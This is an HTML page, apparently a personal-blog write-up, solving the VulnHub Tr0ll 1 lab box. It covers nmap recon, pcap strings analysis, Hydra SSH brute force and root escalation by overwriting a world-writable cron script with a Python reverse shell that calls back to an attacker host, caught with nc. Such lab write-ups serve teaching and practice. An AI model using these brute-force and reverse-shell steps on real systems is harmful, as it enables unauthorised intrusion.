@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html class="dark" lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <!-- ============================================================
+         PRIMARY SEO
+         ============================================================ -->
+    <title>Tr0ll 1 Writeup — VulnHub Easy · pcap, Hydra SSH + Cron Hijack</title>
+    <meta name="description" content="Full writeup for Tr0ll 1 (VulnHub, Easy, Linux): anonymous FTP pcap analysis, web maze enumeration, Hydra SSH brute force, and root cron job hijack via cleaner.py edit."/>
+    <meta name="keywords" content="Tr0ll 1 writeup, VulnHub Tr0ll, FTP pcap CTF, Wireshark forensics, Hydra SSH brute, cron job privesc, cleaner.py exploit, Linux CTF easy, VulnHub walkthrough, Th0mas_sh316y"/>
+    <meta name="author" content="Th0mas_sh316y"/>
+    <meta name="robots" content="index, follow, max-image-preview:large"/>
+    <link rel="canonical" href="https://dorsiawave.dorsia74964.workers.dev/post-tr0ll.html"/>
+
+    <!-- Open Graph -->
+    <meta property="og:type" content="article"/>
+    <meta property="og:title" content="Tr0ll 1 — VulnHub Easy Writeup · Th0mas_sh316y"/>
+    <meta property="og:description" content="Anonymous FTP pcap → web maze → SSH brute → cron hijack to root. The original troll-the-hacker box, fully solved."/>
+    <meta property="og:url" content="https://dorsiawave.dorsia74964.workers.dev/writeups/post-tr0ll.html"/>
+    <meta property="og:image" content="https://dorsiawave.dorsia74964.workers.dev/assests/Tr0llCard.png"/>
+    <meta property="og:site_name" content="Th0mas_sh316y — Security Engineer"/>
+    <meta name="twitter:card" content="summary_large_image"/>
+    <meta name="twitter:title" content="Tr0ll 1 Writeup — VulnHub Easy · Th0mas_sh316y"/>
+    <meta name="twitter:description" content="pcap → directory maze → Hydra SSH → cron hijack → root. Full walk-through."/>
+    <meta name="twitter:site" content="@Th0mas_sh316y"/>
+    <meta name="twitter:image" content="https://dorsiawave.dorsia74964.workers.dev/assests/Tr0llCard.png"/>
+
+    <!-- JSON-LD: TechArticle + BreadcrumbList -->
+    <script type="application/ld+json">
+    [
+      {
+        "@context": "https://schema.org",
+        "@type": "TechArticle",
+        "headline": "Tr0ll 1 — VulnHub Easy Writeup",
+        "description": "Anonymous FTP pcap analysis with Wireshark, web directory maze enumeration, Hydra SSH brute force, and cron job hijack via cleaner.py for root.",
+        "author": { "@type": "Person", "name": "Th0mas_sh316y" },
+        "datePublished": "2026-04-25",
+        "url": "https://dorsiawave.dorsia74964.workers.dev/post-tr0ll.html",
+        "inLanguage": "en",
+        "keywords": "Tr0ll, VulnHub, pcap analysis, Wireshark, Hydra, cron, privesc"
+      },
+      {
+        "@context": "https://schema.org",
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+          { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://dorsiawave.dorsia74964.workers.dev/" },
+          { "@type": "ListItem", "position": 2, "name": "CTF Writeups", "item": "https://dorsiawave.dorsia74964.workers.dev/ctf.html" },
+          { "@type": "ListItem", "position": 3, "name": "Tr0ll 1", "item": "https://dorsiawave.dorsia74964.workers.dev/post-tr0ll.html" }
+        ]
+      }
+    ]
+    </script>
+
+    <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet"/>
+
+    <script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    "colors": {
+                        "outline": "#8d90a1","background": "#0a0a0a","surface-container-low": "#161616",
+                        "on-primary": "#ffffff","outline-variant": "#2a2a2a","on-surface": "#e2e2e2",
+                        "on-surface-variant": "#a0a0a0","primary-container": "#3366ff","surface": "#0a0a0a",
+                        "surface-container": "#121212","primary": "#3366ff","error": "#ffb4ab",
+                        "surface-variant": "#1a1a1a","surface-container-lowest": "#050505",
+                        "on-error": "#690005","on-background": "#e2e2e2"
+                    },
+                    "borderRadius": { "DEFAULT": "0px","lg": "0px","xl": "0px","full": "9999px" },
+                    "fontFamily": { "headline": ["Space Grotesk"],"body": ["Inter"],"label": ["Space Grotesk"] }
+                },
+            },
+        }
+    </script>
+    <style>
+        .material-symbols-outlined { font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24; }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #0a0a0a; }
+        ::-webkit-scrollbar-thumb { background: #3366ff; }
+        body {
+            background-color: #0a0a0a;
+            background-image: radial-gradient(rgba(41,55,97,0.15) 1px, transparent 0),
+                radial-gradient(circle at 50% 50%, #1a1b26 0%, #0a0a0a 100%);
+            background-size: 32px 32px, 100% 100%;
+            background-attachment: fixed;
+        }
+        .bg-vignette { position:fixed;inset:0;pointer-events:none;background:radial-gradient(circle at 50% 50%,transparent 0%,rgba(10,10,10,0.8) 100%);z-index:-1; }
+        pre { overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+        code { font-family: 'Courier New', monospace; }
+    </style>
+</head>
+<body class="text-on-surface font-body selection:bg-primary selection:text-on-primary min-h-screen">
+<div class="bg-vignette"></div>
+
+<!-- NAV -->
+<nav class="fixed top-0 w-full z-50 bg-background/80 backdrop-blur-md border-b border-outline-variant">
+    <div class="flex justify-between items-center w-full px-8 py-5 max-w-[1440px] mx-auto">
+        <div class="text-xl font-bold tracking-tighter text-primary font-headline">Th0mas_sh316y</div>
+        <div class="hidden md:flex items-center space-x-10">
+            <a class="font-label tracking-tighter text-[11px] uppercase text-on-surface/60 hover:text-primary transition-colors" href="../index.html">Home</a>
+            <a class="font-label tracking-tighter text-[11px] uppercase text-on-surface/60 hover:text-primary transition-colors" href="../blog.html">Blog</a>
+            <a class="font-label tracking-tighter text-[11px] uppercase text-primary" href="../ctf.html">CTF Writeups</a>
+        </div>
+    </div>
+</nav>
+
+<main class="pt-24 pb-20 max-w-[1440px] mx-auto px-8 lg:px-12">
+
+    <!-- POST HEADER -->
+    <header class="mb-16">
+        <div class="flex items-center gap-4 mb-6 flex-wrap">
+            <span class="bg-surface-variant text-primary text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-primary/30">CTF WRITEUP</span>
+            <span class="bg-surface-variant text-on-surface/60 text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-outline-variant">VULNHUB</span>
+            <span class="bg-surface-variant text-on-surface/60 text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-outline-variant">BLACK BOX</span>
+            <span class="bg-surface-variant text-on-surface/60 text-[10px] px-3 py-1 font-label font-bold tracking-widest uppercase border border-outline-variant">EASY</span>
+        </div>
+        <h1 class="text-5xl md:text-7xl font-bold text-primary tracking-tight leading-none mb-8 font-headline">
+            Tr0ll 1 — VulnHub Easy
+        </h1>
+        <div class="flex flex-col md:flex-row md:items-center gap-8 border-l-2 border-primary/40 pl-6">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 bg-surface-container-low border border-outline-variant flex items-center justify-center">
+                    <span class="material-symbols-outlined text-primary" style="font-size:18px;">person</span>
+                </div>
+                <div>
+                    <p class="text-xs font-label text-on-surface-variant uppercase tracking-wider">Written By</p>
+                    <p class="text-sm font-headline font-bold text-on-surface">Th0mas_sh316y</p>
+                </div>
+            </div>
+            <div>
+                <p class="text-xs font-label text-on-surface-variant uppercase tracking-wider mb-1">Difficulty</p>
+                <div class="flex gap-1">
+                    <span class="w-2 h-2 bg-primary"></span>
+                    <span class="w-2 h-2 bg-outline-variant"></span>
+                    <span class="w-2 h-2 bg-outline-variant"></span>
+                    <span class="w-2 h-2 bg-outline-variant"></span>
+                    <span class="w-2 h-2 bg-outline-variant"></span>
+                </div>
+            </div>
+            <div>
+                <p class="text-xs font-label text-on-surface-variant uppercase tracking-wider">Platform</p>
+                <p class="text-sm font-headline font-bold text-on-surface">VulnHub</p>
+            </div>
+            <div>
+                <p class="text-xs font-label text-on-surface-variant uppercase tracking-wider">Target IP</p>
+                <p class="text-sm font-mono font-bold text-primary">192.168.1.20</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- HERO THUMBNAIL -->
+    <div class="mb-12 relative overflow-hidden border border-outline-variant/60 group" style="height:280px;">
+        <img src="../assests/Tr0llCard.png" alt="Tr0ll 1 Machine" class="w-full h-full object-cover grayscale group-hover:grayscale-0 opacity-50 group-hover:opacity-75 group-hover:scale-105 transition-all duration-1000"/>
+        <div class="absolute inset-0 bg-gradient-to-t from-background via-background/30 to-transparent pointer-events-none"></div>
+        <div class="absolute bottom-4 left-6 flex items-center gap-3">
+            <span class="w-2 h-2 bg-primary animate-pulse"></span>
+            <span class="font-label text-[9px] uppercase tracking-[0.3em] text-primary">Machine: Tr0ll 1 · Easy · Linux · VulnHub</span>
+        </div>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-[1fr_280px] gap-16 items-start">
+
+        <!-- ARTICLE BODY -->
+        <article class="space-y-12">
+
+            <!-- SECTION 0: Introduction -->
+            <section id="introduction">
+                <p class="text-xl font-body text-on-surface-variant leading-relaxed">
+                    The author named this box "Tr0ll" for a reason. Almost every step has a fake-out — a file called <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">Pass.txt</code> that isn't the password, a binary called <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">roflmao</code> that gives a hex address you have to interpret as a path, a cron-job script with a misleading name. It's frustrating in the best way — every time you think you've got it, the box laughs at you. I've ranked it Easy because nothing here is technically hard, just deliberately annoying. Got it in around an hour and a half.
+                </p>
+            </section>
+
+            <!-- SECTION 1: Recon -->
+            <section class="space-y-6" id="recon">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">01_Reconnaissance</h2>
+                <p class="text-on-surface-variant leading-relaxed">Three open ports — FTP, SSH, HTTP. The FTP banner tells you it's vsftpd 3.0.2 with anonymous login allowed (already a giveaway). Web on port 80 just shows a single trolling image. SSH waits for credentials.</p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / nmap</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ sudo nmap -sC -sV -p- --min-rate 5000 192.168.1.20</span>
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxrwxrwx 1 1000 0  8068 Aug 09 2014 lol.pcap
+22/tcp open  ssh     OpenSSH 6.6.1p1
+80/tcp open  http    Apache httpd 2.4.7</pre>
+                </div>
+            </section>
+
+            <!-- SECTION 2: pcap Analysis -->
+            <section class="space-y-6" id="pcap-analysis">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">02_FTP_pcap_Forensics</h2>
+                <p class="text-on-surface-variant leading-relaxed">Anonymous FTP, grab <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">lol.pcap</code>. You can open it in Wireshark for the full GUI experience, but a quick <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">strings</code> pulls everything you need. There's an FTP session captured inside referencing a <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">secret_stuff.txt</code> file and mentioning a path called <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">sup3rs3cretdirlol</code>.</p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / ftp + strings</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ ftp 192.168.1.20</span>
+Name: anonymous
+ftp> get lol.pcap
+ftp> bye
+
+<span class="text-primary font-bold">$ strings lol.pcap | grep -i "secret\|stuff\|dir"</span>
+secret_stuff.txt
+<span class="text-on-surface font-bold bg-primary/10 px-1">Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cretdirlol :-P</span></pre>
+                </div>
+            </section>
+
+            <!-- SECTION 3: Web Maze -->
+            <section class="space-y-6" id="web-maze">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">03_Web_Directory_Maze</h2>
+                <p class="text-on-surface-variant leading-relaxed">Browsing to <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">/sup3rs3cretdirlol/</code> reveals a single binary called <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">roflmao</code>. Download it, mark it executable, run it. Output is a hex address that you're supposed to read as a path: <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">0x0856BF</code>.</p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / roflmao</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ wget http://192.168.1.20/sup3rs3cretdirlol/roflmao</span>
+$ chmod +x roflmao && ./roflmao
+
+<span class="text-on-surface font-bold bg-primary/10 px-1">Find address 0x0856BF to proceed</span></pre>
+                </div>
+
+                <p class="text-on-surface-variant leading-relaxed">Plug that into the URL: <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">/0x0856BF/</code>. Two folders inside: <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">good_luck/</code> and <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">this_folder_contains_the_password/</code>. The names lie. Inside the first you find <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">which_one_lol.txt</code> — a list of usernames. Inside the second, <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">Pass.txt</code> contains a single string: <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">Good_job_:)</code>.</p>
+
+                <div class="border-l-4 border-primary bg-primary/5 p-6">
+                    <p class="text-[10px] font-label font-bold text-primary tracking-widest uppercase mb-2">Troll Note</p>
+                    <p class="text-on-surface-variant text-sm leading-relaxed"><code class="text-primary">Pass.txt</code> contains "Good_job_:)" — and the troll is that this <em>is</em> the password. Most people read it as a sarcastic congratulation message ("good job finding nothing") and move on. Try it before assuming it's a fake-out.</p>
+                </div>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / harvest creds</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ curl http://192.168.1.20/0x0856BF/good_luck/which_one_lol.txt</span>
+maleus
+ps-aux
+felux
+Eagle11
+genphlux  &lt;-- definitely this one
+usmc8892
+blawrg
+wytshadow
+vis1t0r
+<span class="text-on-surface font-bold bg-primary/10 px-1">overflow</span>
+
+<span class="text-primary font-bold">$ curl http://192.168.1.20/0x0856BF/this_folder_contains_the_password/Pass.txt</span>
+<span class="text-on-surface font-bold bg-primary/10 px-1">Good_job_:)</span></pre>
+                </div>
+            </section>
+
+            <!-- SECTION 4: SSH Brute Force -->
+            <section class="space-y-6" id="ssh-brute">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">04_Hydra_SSH_Brute</h2>
+                <p class="text-on-surface-variant leading-relaxed">11 candidate usernames, one password to test. Hydra cycles through them quickly. The hit is <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">overflow</code>.</p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / hydra ssh</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ hydra -L which_one_lol.txt -p 'Good_job_:)' ssh://192.168.1.20</span>
+
+[22][ssh] host: 192.168.1.20  <span class="text-on-surface font-bold bg-primary/10 px-1">login: overflow  password: Good_job_:)</span>
+
+<span class="text-primary font-bold">$ ssh overflow@192.168.1.20</span>
+overflow@192.168.1.20's password: [REDACTED]
+
+<span class="text-on-surface font-bold bg-primary/10 px-1">overflow@troll:~$</span></pre>
+                </div>
+            </section>
+
+            <!-- SECTION 5: Cron Job Hijack -->
+            <section class="space-y-6" id="privesc">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">05_PrivEsc_via_Cron_Job_Hijack</h2>
+                <p class="text-on-surface-variant leading-relaxed">No sudo permissions. No useful SUIDs. The win is in <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">/etc/cron.d/</code> — there's a script called <code class="bg-surface-container-low px-2 py-0.5 text-primary text-xs">cleaner.py</code> that runs every two minutes as <strong class="text-on-surface">root</strong>, and the file is world-writable. That's it. Replace its contents with a reverse shell, wait two minutes, get a root callback.</p>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / cron enum + hijack</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">overflow@troll:~$ cat /etc/crontab</span>
+*/2 *  * * *   root    /lib/log/cleaner.py
+
+overflow@troll:~$ ls -la /lib/log/cleaner.py
+<span class="text-on-surface font-bold bg-primary/10 px-1">-rwxrwxrwx 1 root root 73 cleaner.py</span>
+
+overflow@troll:~$ cat /lib/log/cleaner.py
+#!/usr/bin/env python
+import os
+os.system('rm -r /tmp/* ')
+
+<span class="text-primary font-bold"># Overwrite with a reverse shell payload</span>
+overflow@troll:~$ cat &gt; /lib/log/cleaner.py &lt;&lt;'EOF'
+#!/usr/bin/env python
+import os,socket,subprocess
+s=socket.socket()
+s.connect(("192.168.1.100",4444))
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])
+EOF</pre>
+                </div>
+
+                <div class="bg-surface-container-lowest border-l-4 border-primary p-6 font-mono text-sm">
+                    <div class="flex items-center gap-2 mb-4">
+                        <span class="w-3 h-3 rounded-full bg-error/40"></span>
+                        <span class="w-3 h-3 rounded-full bg-on-surface/20"></span>
+                        <span class="w-3 h-3 rounded-full bg-primary/40"></span>
+                        <span class="ml-2 text-[10px] text-on-surface-variant font-label uppercase">terminal / nc listener (attacker)</span>
+                    </div>
+                    <pre class="text-on-surface-variant"><span class="text-primary font-bold">$ nc -lvnp 4444</span>
+
+<span class="text-on-surface/60"># Wait up to 2 minutes for the cron tick...</span>
+<span class="text-on-surface font-bold bg-primary/10 px-1">connect to [192.168.1.100] from (UNKNOWN) [192.168.1.20] 51433</span>
+
+# id
+<span class="text-on-surface font-bold bg-primary/10 px-1">uid=0(root) gid=0(root) groups=0(root)</span>
+
+# cat /root/proof.txt
+<span class="text-on-surface font-bold bg-primary/10 px-1">[REDACTED] — root flag captured</span></pre>
+                </div>
+
+                <div class="border-l-4 border-primary bg-primary/5 p-6">
+                    <p class="text-[10px] font-label font-bold text-primary tracking-widest uppercase mb-2">Technique Note — Writable Root Cron</p>
+                    <p class="text-on-surface-variant text-sm leading-relaxed">A world-writable script executed by root cron is the textbook "give me root" misconfig. <code class="text-primary">/etc/crontab</code>, <code class="text-primary">/etc/cron.d/</code>, and <code class="text-primary">/etc/cron.{hourly,daily,weekly,monthly}/</code> are the four directories I always check immediately after landing a low-priv shell. Combine that with <code class="text-primary">find / -writable -type f 2&gt;/dev/null | grep -v proc</code> and you'll usually surface the issue within thirty seconds.</p>
+                </div>
+            </section>
+
+            <!-- Attack Chain Summary -->
+            <section class="space-y-4" id="summary">
+                <h2 class="text-3xl font-bold text-primary tracking-tight font-headline border-b border-outline-variant pb-4">06_Attack_Chain_Summary</h2>
+                <div class="bg-surface-container-low border border-outline-variant p-8">
+                    <ol class="space-y-4 font-label text-xs uppercase tracking-widest text-on-surface-variant">
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">01</span> Nmap → ports 21 (FTP anon), 22 (SSH), 80 (HTTP)</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">02</span> Anonymous FTP → download lol.pcap</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">03</span> strings on pcap → reveals /sup3rs3cretdirlol/ path</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">04</span> /sup3rs3cretdirlol/roflmao binary → outputs 0x0856BF (path)</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">05</span> /0x0856BF/good_luck/which_one_lol.txt → 11 usernames</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">06</span> /0x0856BF/this_folder_contains_the_password/Pass.txt → "Good_job_:)" (literal password)</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">07</span> Hydra SSH → overflow:Good_job_:)</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">08</span> /etc/crontab → cleaner.py runs as root every 2 min and is 777</li>
+                        <li class="flex items-start gap-4"><span class="text-primary font-bold w-6 shrink-0">09</span> Overwrite cleaner.py with reverse shell → wait 2 min → root → proof.txt</li>
+                    </ol>
+                </div>
+            </section>
+
+            <!-- Footer -->
+            <footer class="pt-12 border-t border-outline-variant flex flex-col md:flex-row justify-between items-center gap-6">
+                <a href="../ctf.html" class="flex items-center gap-2 text-xs font-label font-bold text-on-surface-variant uppercase hover:text-primary transition-colors">
+                    <span class="material-symbols-outlined" style="font-size:16px;">arrow_back</span> Back to CTF Lab
+                </a>
+                <div class="flex flex-wrap gap-2">
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#FTP_ANON</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#PCAP</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#WIRESHARK</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#HYDRA</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#CRON_HIJACK</span>
+                    <span class="px-3 py-1 bg-surface-container-low border border-outline-variant text-[10px] font-label font-bold text-on-surface uppercase">#PRIVESC</span>
+                </div>
+            </footer>
+        </article>
+
+        <!-- SIDEBAR -->
+        <aside class="sticky top-32 space-y-10 hidden lg:block">
+            <nav class="space-y-4">
+                <h4 class="text-xs font-label font-bold text-on-surface-variant uppercase tracking-[0.2em]">Table of Contents</h4>
+                <ul class="space-y-3 border-l border-outline-variant">
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-primary border-l-2 border-primary -ml-[1.5px]" href="#introduction">00_Introduction</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#recon">01_Reconnaissance</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#pcap-analysis">02_FTP_pcap</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#web-maze">03_Web_Maze</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#ssh-brute">04_Hydra_SSH</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#privesc">05_Cron_Hijack</a></li>
+                    <li><a class="block pl-4 py-1 text-sm font-headline text-on-surface-variant hover:text-primary transition-all" href="#summary">06_Attack_Chain</a></li>
+                </ul>
+            </nav>
+            <div class="p-6 bg-surface-container-low border border-outline-variant">
+                <h4 class="text-xs font-label font-bold text-on-surface-variant uppercase tracking-[0.2em] mb-5">Machine Info</h4>
+                <div class="space-y-3">
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Machine</span><span class="text-xs font-headline font-bold text-on-surface">Tr0ll 1</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Author</span><span class="text-xs font-headline font-bold text-on-surface">Th0mas_sh316y</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Platform</span><span class="text-xs font-headline font-bold text-on-surface">VulnHub</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Type</span><span class="text-xs font-headline font-bold text-on-surface">Black Box</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Difficulty</span><span class="text-xs font-headline font-bold text-on-surface/60">Easy</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Target IP</span><span class="text-xs font-mono font-bold text-primary">192.168.1.20</span></div>
+                    <div class="flex justify-between"><span class="text-[10px] font-label text-on-surface-variant uppercase">Status</span><span class="text-xs font-headline font-bold text-primary">Pwned ✓</span></div>
+                </div>
+            </div>
+            <div class="p-6 bg-surface-container-low border border-outline-variant">
+                <h4 class="text-xs font-label font-bold text-on-surface-variant uppercase tracking-[0.2em] mb-4">Download VM</h4>
+                <a href="https://www.vulnhub.com/entry/tr0ll-1,100/" target="_blank"
+                   class="flex items-center gap-3 text-[10px] font-label font-bold text-primary uppercase tracking-widest border-b border-primary/30 pb-1 hover:border-primary hover:gap-4 transition-all">
+                    VulnHub Page <span class="material-symbols-outlined" style="font-size:14px;">open_in_new</span>
+                </a>
+            </div>
+            <div class="p-6 bg-surface-container-low border border-outline-variant">
+                <h4 class="text-xs font-label font-bold text-on-surface-variant uppercase tracking-[0.2em] mb-4">Tools Used</h4>
+                <ul class="space-y-2">
+                    <li class="text-[10px] font-label text-on-surface-variant uppercase tracking-wider flex items-center gap-2"><span class="w-1 h-1 bg-primary inline-block"></span> nmap</li>
+                    <li class="text-[10px] font-label text-on-surface-variant uppercase tracking-wider flex items-center gap-2"><span class="w-1 h-1 bg-primary inline-block"></span> ftp / strings</li>
+                    <li class="text-[10px] font-label text-on-surface-variant uppercase tracking-wider flex items-center gap-2"><span class="w-1 h-1 bg-primary inline-block"></span> Wireshark (optional)</li>
+                    <li class="text-[10px] font-label text-on-surface-variant uppercase tracking-wider flex items-center gap-2"><span class="w-1 h-1 bg-primary inline-block"></span> Hydra</li>
+                    <li class="text-[10px] font-label text-on-surface-variant uppercase tracking-wider flex items-center gap-2"><span class="w-1 h-1 bg-primary inline-block"></span> netcat</li>
+                </ul>
+            </div>
+        </aside>
+    </div>
+</main>
+
+<footer class="w-full py-16 bg-background/90 backdrop-blur-md border-t border-outline-variant mt-20">
+    <div class="flex flex-col md:flex-row justify-between items-center px-12 max-w-[1440px] mx-auto gap-10">
+        <div class="flex flex-col gap-2">
+            <span class="font-headline font-bold text-primary text-xl tracking-tighter">Th0mas_sh316y</span>
+            <span class="font-label text-[10px] text-on-surface/40 uppercase tracking-[0.4em]">Security Engineer · Pentester · Red Team</span>
+        </div>
+        <div class="flex gap-12">
+            <a class="font-label text-[11px] tracking-widest uppercase text-on-surface/50 hover:text-primary transition-colors" href="https://github.com/dorsia74964" target="_blank">GitHub</a>
+            <a class="font-label text-[11px] tracking-widest uppercase text-on-surface/50 hover:text-primary transition-colors" href="https://www.linkedin.com/in/dorsia74964" target="_blank">LinkedIn</a>
+            <a class="font-label text-[11px] tracking-widest uppercase text-on-surface/50 hover:text-primary transition-colors" href="https://x.com/Th0mas_Sh316y">Twitter</a>
+        </div>
+        <div class="font-label text-[11px] tracking-widest uppercase text-on-surface/30">© 2026 Th0mas_sh316y. ALL RIGHTS RESERVED.</div>
+    </div>
+</footer>
+</body>
+</html>
